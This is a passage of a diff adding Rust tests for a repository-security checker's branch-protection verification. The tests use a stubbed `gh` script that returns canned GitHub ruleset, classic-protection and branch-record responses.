+                  steps:\n      - run: echo ok\n";
+        assert!(injection_findings(wf).is_empty());
+    }
+
     #[test]
     fn pull_request_target_trigger_detected_in_array_and_map_forms() {
         let array_wf = "on: [push, pull_request_target]\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
@@ -1399,6 +2072,269 @@ esac
         assert!(result.messages.iter().any(|m| m.contains("missing")
             && m.contains("could not query rules API")
             && m.contains("branch may not exist on the remote")));
+    }
+
+    /// A bootstrapped repo whose config names `branches` as protected and
+    /// `acme/demo` as the GitHub repo, so the stubbed `gh` is what answers.
+    fn ctx_with_protected_branches(branches: &str) -> (tempfile::TempDir, Ctx) {
+        let (d, ctx) = repo();
+        let cfg_text = std::fs::read_to_string(ctx.config_path())
+            .unwrap()
+            .replace(
+                "protected_branches = [\"main\", \"master\"]",
+                &format!("protected_branches = [{branches}]"),
+            )
+            .replace(
+                "# github_repo = \"owner/repo\"  # set to enable GitHub API checks",
+                "github_repo = \"acme/demo\"",
+            );
+        std::fs::write(ctx.config_path(), cfg_text).unwrap();
+        let ctx = Ctx::discover(&ctx.root).unwrap();
+        (d, ctx)
+    }
+
+    /// The three-read stub: `classic` is protected only the classic way
+    /// (rulesets `[]`, admin read succeeds); `locked` is protected but the
+    /// token is not admin (rulesets `[]`, classic 404, public flag `true`);
+    /// `open` is genuinely unprotected (rulesets `[]`, classic 404, flag
+    /// `false`); `ruled` has rulesets and a classic endpoint that refuses.
+    /// `*/rules/branches/X` precedes `*/branches/X` because both patterns
+    /// end the same way.
+    const THREE_READ_GH: &str = r#"#!/bin/sh
+case "$2" in
+    */rules/branches/classic)
+        echo '[]'
+        exit 0
+        ;;
+    */branches/classic/protection)
+        echo '{"required_status_checks":{"strict":true,"contexts":["ci"]},"enforce_admins":{"enabled":true},"required_pull_request_reviews":{"dismiss_stale_reviews":true,"require_code_owner_reviews":true,"required_approving_review_count":1,"require_last_push_approval":true},"required_signatures":{"enabled":true},"allow_force_pushes":{"enabled":false},"allow_deletions":{"enabled":false}}'
+        exit 0
+        ;;
+    */rules/branches/locked)
+        echo '[]'
+        exit 0
+        ;;
+    */branches/locked/protection)
+        echo "HTTP 404: Not Found (https://api.github.com/repos/acme/demo/branches/locked/protection)" 1>&2
+        exit 1
+        ;;
+    */branches/locked)
+        echo '{"name":"locked","protected":true}'
+        exit 0
+        ;;
+    */rules/branches/open)
+        echo '[]'
+        exit 0
+        ;;
+    */branches/open/protection)
+        echo "HTTP 404: Branch not protected" 1>&2
+        exit 1
+        ;;
+    */branches/open)
+        echo '{"name":"open","protected":false}'
+        exit 0
+        ;;
+    */rules/branches/ruled)
+        echo '[{"type":"pull_request","parameters":{"dismiss_stale_reviews_on_push":true,"required_approving_review_count":0}},{"type":"non_fast_forward"},{"type":"required_signatures"},{"type":"required_status_checks","parameters":{"strict_required_status_checks_policy":true}},{"type":"deletion"}]'
+        exit 0
+        ;;
+    */branches/ruled/protection)
+        echo "HTTP 403: Resource not accessible by integration" 1>&2
+        exit 1
+        ;;
+    */rules/branches/renamed)
+        echo '[]'
+        exit 0
+        ;;
+    */branches/renamed/protection)
+        echo "gh: Branch not found (HTTP 404)" 1>&2
+        exit 1
+        ;;
+    */branches/renamed)
+        echo '{"name":"main","protected":true}'
+        exit 0
+        ;;
+    *)
+        echo "HTTP 404: Not Found" 1>&2
+        exit 1
+        ;;
+esac
+"#;
+
+    /// ISC-11: a branch protected ONLY the classic way answers `[]` on the
+    /// rulesets API. The classic endpoint is read and translated, so every
+    /// rule and every Scorecard knob scores exactly as a ruleset would — the
+    /// live bug (a fully protected branch scoring as unprotected) is closed.
+    #[test]
+    fn branch_protection_reads_classic_protection_when_rulesets_are_empty() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+        let (_d, ctx) = ctx_with_protected_branches("\"classic\"");
+        let cfg = ctx.require_config().unwrap();
+
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
+        for needle in [
+            "classic: no rulesets — read via classic branch protection",
+            "classic: required pull requests ✓",
+            "classic: force-push blocking ✓",
+            "classic: required signed commits ✓",
+            "classic: required status checks ✓",
+            "classic: deletion protection ✓",
+            "classic: Scorecard — stale-review dismissal ✓",
+            "classic: Scorecard — ≥1 required approving review ✓",
+            "classic: Scorecard — code-owner review ✓",
+            "classic: Scorecard — last-push approval ✓",
+            "classic: Scorecard — branch-up-to-date (strict) ✓",
+        ] {
+            assert!(
+                result.messages.iter().any(|m| m.contains(needle)),
+                "missing {needle:?} in {:?}",
+                result.messages
+            );
+        }
+        assert!(!result.messages.iter().any(|m| m.contains("MISSING")));
+    }
+
+    /// ISC-12: rulesets present → the classic endpoint is never consulted,
+    /// so its 403 cannot touch the verdict, and no classic surface is named.
+    #[test]
+    fn branch_protection_rulesets_stand_when_classic_endpoint_refuses() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+        let (_d, ctx) = ctx_with_protected_branches("\"ruled\"");
+        let cfg = ctx.require_config().unwrap();
+
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("ruled: required pull requests ✓")));
+        assert!(!result.messages.iter().any(|m| m.contains("classic")));
+    }
+
+    /// ISC-47 (a): rulesets `[]`, classic 404, public record `protected:
+    /// true` — protection exists but is unreadable with this token. That is
+    /// Degraded with the flag named, never Pass from a flag and never Fail.
+    #[test]
+    fn branch_protection_degrades_when_protected_but_unreadable() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+        let (_d, ctx) = ctx_with_protected_branches("\"locked\"");
+        let cfg = ctx.require_config().unwrap();
+
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
+        assert!(result.messages.iter().any(|m| m.contains("locked:")
+            && m.contains("`protected: true`")
+            && m.contains("admin token")
+            && m.contains("UNVERIFIED")));
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("1 protected branch(es) could not be read")));
+        assert!(!result.messages.iter().any(|m| m.contains("MISSING")));
+    }
+
+    /// ISC-47 (b): rulesets `[]`, classic 404, public record `protected:
+    /// false` — genuinely unprotected, so every rule is MISSING and the
+    /// control Fails, with the flag named so the reader knows all three
+    /// surfaces were consulted.
+    #[test]
+    fn branch_protection_fails_when_public_record_says_unprotected() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+        let (_d, ctx) = ctx_with_protected_branches("\"open\"");
+        let cfg = ctx.require_config().unwrap();
+
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Fail, "{:?}", result.messages);
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("open:") && m.contains("`protected: false`")));
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("open: MISSING required pull requests")));
+    }
+
+    /// A real gap on one branch outranks an unreadable other: Fail, not
+    /// Degraded — the unreadable branch is still reported.
+    #[test]
+    fn branch_protection_fail_outranks_unreadable() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+        let (_d, ctx) = ctx_with_protected_branches("\"locked\", \"open\"");
+        let cfg = ctx.require_config().unwrap();
+
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Fail, "{:?}", result.messages);
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("locked:") && m.contains("`protected: true`")));
+    }
+
+    /// Seen live (2026-09-07): GitHub answers `GET /branches/master` on a repo
+    /// with no `master` with the DEFAULT branch's record, `protected: true`
+    /// and all — a followed redirect. The flag must be trusted only when the
+    /// record names the branch asked for; a redirect is "not found", it is
+    /// not "protected but unreadable", and alone it verifies nothing.
+    #[test]
+    fn branch_protection_public_record_redirect_is_not_found() {
+        let lock = env_lock();
+        lock.fake_tool("gh", THREE_READ_GH);
+
+        let (_d, ctx) = ctx_with_protected_branches("\"classic\", \"renamed\"");
+        let cfg = ctx.require_config().unwrap();
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Pass, "{:?}", result.messages);
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("renamed: not found on the remote")
+                && m.contains("answered for `main` instead")));
+        assert!(!result
+            .messages
+            .iter()
+            .any(|m| m.contains("renamed:") && m.contains("protected: true")));
+
+        let (_d, ctx) = ctx_with_protected_branches("\"renamed\"");
+        let cfg = ctx.require_config().unwrap();
+        let result = verify_branch_protection(&ctx, cfg);
+        assert_eq!(result.outcome, Outcome::Degraded, "{:?}", result.messages);
+        assert!(result
+            .messages
+            .iter()
+            .any(|m| m.contains("NOTHING VERIFIED")));
+    }
+
+    /// Classic translation is exact for the "everything off" shape too:
+    /// `allow_*` toggles on and no review object mean no rules at all.
+    #[test]
+    fn classic_protection_translation_handles_permissive_shape() {
+        let permissive = serde_json::json!({
+            "allow_force_pushes": {"enabled": true},
+            "allow_deletions": {"enabled": true},
+            "required_signatures": {"enabled": false}
+        });
+        assert!(classic_protection_as_rules(&permissive).is_empty());
+
+        let checks_only = serde_json::json!({
+            "required_status_checks": {"strict": false, "contexts": []}
+        });
+        let rules = classic_protection_as_rules(&checks_only);
+        let types: Vec<&str> = rules.iter().filter_map(|r| r["type"].as_str()).collect();
+        assert_eq!(
+            types,
+            ["non_fast_forward", "deletion", "required_status_checks"]
+        );
+        assert_eq!(
+            rules[2]["parameters"]["strict_required_status_checks_policy"],
+            serde_json::Value::Bool(false)
+        );
     }
 
     #[test]
